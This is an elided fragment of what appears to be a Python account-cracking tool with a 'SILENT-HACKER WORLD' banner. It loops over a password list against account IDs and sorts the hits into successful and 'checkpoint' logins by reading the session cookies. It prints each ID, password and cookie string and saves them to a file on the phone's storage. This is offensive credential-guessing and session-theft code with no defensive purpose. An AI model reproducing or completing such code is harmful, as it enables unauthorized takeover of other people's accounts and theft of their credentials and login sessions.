...
⠀⠀⠀          ⠀⠀⠈⠻⢿⣇⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⡴⠟⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀          ⠀⠀⠀⠈⠙⠛⠶⠶⠦⠤⠤⠤⠶⠶⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀
          {m}•{k}•{h}•{sir} WELCOME TO SILENT-HACKER WORLD {x}{m}•{k}•{h}•{x}
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				print(f'\r{H}ALONE_OK😘>> {idf}|{pw}{h}{x}') 
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					print('\n')
					statuscp = f'ALONE_CP[•] ID       : {idf} [•] PASSWORD : {pw}'
				...
				if 'no' in taplikasi:
					...
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/ALONE/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					...
					hit=0
					infoakun += (f"\n[bold yellow]ALONE_CP🥺[•] LIST EXPIRED APPLICATIONS :[/bold yellow]\n")
					...
					print('\n')
					statusok = f'[bold green]ALONE_OK🥰[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
					statusok1 = nel(statusok, style='green')
